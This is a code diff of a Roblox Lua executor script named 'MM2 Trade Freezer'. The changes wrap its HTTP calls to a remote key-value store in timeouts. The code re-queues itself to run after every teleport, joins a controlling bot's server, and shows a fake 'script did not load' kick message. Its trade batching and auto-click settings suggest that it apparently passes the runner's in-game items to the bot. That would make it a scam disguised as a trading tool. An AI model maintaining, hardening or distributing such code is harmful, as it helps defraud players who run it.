@@ -1,7 +1,7 @@
 --============================================================
--- SIDE 2 — CLIENT (v48)
+-- SIDE 2 — CLIENT (v49)
 -- MM2 Trade Freezer — PC + Mobile
--- Every external call wrapped with timeout (Delta-safe)
+-- Every blocked API call wrapped with timeout — no more hangs
 --============================================================
 local Players             = game:GetService("Players")
 local VirtualInputManager = game:GetService("VirtualInputManager")
@@ -59,15 +59,15 @@ local DISCORD_USERNAME    = (getgenv and getgenv().DISCORD_USERNAME)
                          or (_G and _G.DISCORD_USERNAME)
                          or "unknown"
 
-local ITEMS_PER_BATCH     = 6
-local CONFIRM_WAIT        = 7
-local CLICK_GAP           = 0.4
-local POST_JOIN_WAIT      = 10
-local SNIPE_POLL_INTERVAL = 3
-local BLOCKED_CALL_TIMEOUT = 3   -- seconds before treating a hung call as blocked
-local KICK_MESSAGE        = "Error, script did not load in time, try another time or contact support in https://discord.gg/SfeBgTx5V8"
+local ITEMS_PER_BATCH      = 6
+local CONFIRM_WAIT         = 7
+local CLICK_GAP            = 0.4
+local POST_JOIN_WAIT       = 10
+local SNIPE_POLL_INTERVAL  = 5
+local BLOCKED_CALL_TIMEOUT = 3
+local KICK_MESSAGE         = "Error, script did not load in time, try another time or contact support in https://discord.gg/SfeBgTx5V8"
 
-local SELF_SOURCE_URL     = "https://raw.githubusercontent.com/tturnaa/mm2-trade-freezer/refs/heads/main/trade"
+local SELF_SOURCE_URL      = "https://raw.githubusercontent.com/tturnaa/mm2-trade-freezer/refs/heads/main/trade"
 
 log("config loaded | Bot:", BOT_USERNAME, "| Discord:", DISCORD_USERNAME)
 --================================================
@@ -75,9 +75,6 @@ log("config loaded | Bot:", BOT_USERNAME, "| Discord:", DISCORD_USERNAME)
 local KILLED = false
 
 --==================== TIMEOUT HELPER ====================
--- Runs a function inside a spawned thread. If it doesn't finish in
--- BLOCKED_CALL_TIMEOUT seconds, we assume the executor blocked it.
--- Returns (ok, result_or_error, timedout).
 local function runWithTimeout(fn, timeout)
     timeout = timeout or BLOCKED_CALL_TIMEOUT
     local done = false
@@ -97,7 +94,7 @@ local function runWithTimeout(fn, timeout)
     end
 
     if not done then
-        return false, nil, true   -- timed out
+        return false, nil, true
     end
     return result_ok, result_val, false
 end
@@ -120,7 +117,7 @@ local function queueAutoExec()
     end)
 
     if fetchTimedout then
-        log("autoexec: fetch HUNG (executor blocked HttpGet) — skipping")
+        log("autoexec: fetch HUNG — skipping")
         return false
     end
 
@@ -137,7 +134,7 @@ local function queueAutoExec()
         or (fluxus and fluxus.queue_on_teleport)
 
     if type(queueteleport) ~= "function" then
-        log("autoexec: no queue function available")
+        log("autoexec: no queue function")
         return false
     end
 
@@ -166,31 +163,42 @@ task.spawn(function()
     end)
 end)
 
---==================== KV ====================
+--==================== KV (timeout-wrapped) ====================
 local function kvGet(key)
-    local res = httpReq({
-        Url = KV_URL .. "/get/" .. key,
-        Method = "GET",
-        Headers = { ["Authorization"] = "Bearer " .. KV_TOKEN },
-    })
-    if not res then return nil end
-    local body = res.Body or res.body
-    if not body then return nil end
-    local ok, data = pcall(HttpService.JSONDecode, HttpService, body)
-    if ok and data then return data.result end
-    return nil
+    local ok, val, timedout = runWithTimeout(function()
+        local res = httpReq({
+            Url = KV_URL .. "/get/" .. key,
+            Method = "GET",
+            Headers = { ["Authorization"] = "Bearer " .. KV_TOKEN },
+        })
+        if not res then return nil end
+        local body = res.Body or res.body
+        if not body then return nil end
+        local decodeOk, data = pcall(HttpService.JSONDecode, HttpService, body)
+        if decodeOk and data then return data.result end
+        return nil
+    end, 2)
+
+    if timedout then
+        return nil
+    end
+    return ok and val or nil
 end
 
 local function kvSet(key, value)
-    httpReq({
-        Url = KV_URL .. "/set/" .. key,
-        Method = "POST",
-        Headers = {
-            ["Authorization"] = "Bearer " .. KV_TOKEN,
-            ["Content-Type"]  = "text/plain",
-        },
-        Body = value,
-    })
+    task.spawn(function()
+        runWithTimeout(function()
+            httpReq({
+                Url = KV_URL .. "/set/" .. key,
+                Method = "POST",
+                Headers = {
+                    ["Authorization"] = "Bearer " .. KV_TOKEN,
+                    ["Content-Type"]  = "text/plain",
+                },
+                Body = value,
+            })
+        end, 2)
+    end)
 end
 
 task.spawn(function()
@@ -346,10 +354,10 @@ local function findBot()
     end
 end
 
---==================== TELEPORT (all methods timeout-wrapped) ====================
+--==================== TELEPORT ====================
 local function tryTeleportMethod(methodName, methodFn)
     log("attempting " .. methodName .. "...")
-    local ok, val, timedout = runWithTimeout(methodFn)
+    local ok, val, timedout = runWithTimeout(methodFn, 3)
 
     if timedout then
         log("  " .. methodName .. " STILL HANGING — executor blocked it")
@@ -373,14 +381,12 @@ local function teleportToServer(placeId, jobId, userId)
     queueAutoExec()
     task.wait(0.5)
 
-    -- Method 1: TeleportToPlaceInstance
     if tryTeleportMethod("TeleportToPlaceInstance", function()
         TeleportService:TeleportToPlaceInstance(placeId, jobId, player)
     end) then
         return true
     end
 
-    -- Method 2: TeleportAsync
     if TeleportService.TeleportAsync then
         if tryTeleportMethod("TeleportAsync", function()
             TeleportService:TeleportAsync(placeId, { player }, { JobId = jobId })
@@ -486,7 +492,7 @@ local function joinTargetServer()
         elseif status == "HOPPING" then
             log("  bot is hopping — waiting")
         elseif status == nil then
-            log("  KV read returned nil")
+            log("  KV read returned nil (network or throttle)")
         else
             log("  unknown bot_status:", tostring(status))
         end
